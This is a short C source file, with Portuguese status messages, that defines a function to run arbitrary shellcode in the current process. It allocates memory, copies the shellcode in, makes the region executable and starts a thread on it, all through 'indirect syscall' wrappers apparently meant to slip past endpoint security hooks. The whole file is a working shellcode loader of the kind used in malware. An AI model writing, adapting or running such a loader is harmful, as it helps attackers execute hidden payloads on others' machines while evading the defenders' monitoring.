#include "syscalls.h"
#include <stdio.h>

void ExecuteShellcode(PBYTE shellcode, SIZE_T size) {
    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddr = NULL;
    SIZE_T regionSize = size;

    NTSTATUS status = NtAllocateVirtualMemory_Indirect(hProcess, &baseAddr, 0, &regionSize,
                                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtAllocateVirtualMemory falhou\n");
        return;
    }

    memcpy(baseAddr, shellcode, size);

    ULONG oldProtect;
    NtProtectVirtualMemory_Indirect(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = NULL;
    NtCreateThreadEx_Indirect(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                              baseAddr, NULL, FALSE, 0, 0, 0, NULL);

    if (hThread) {
        printf("[+] Shellcode executado via indirect syscall!\n");
        WaitForSingleObject(hThread, 5000);
    }
}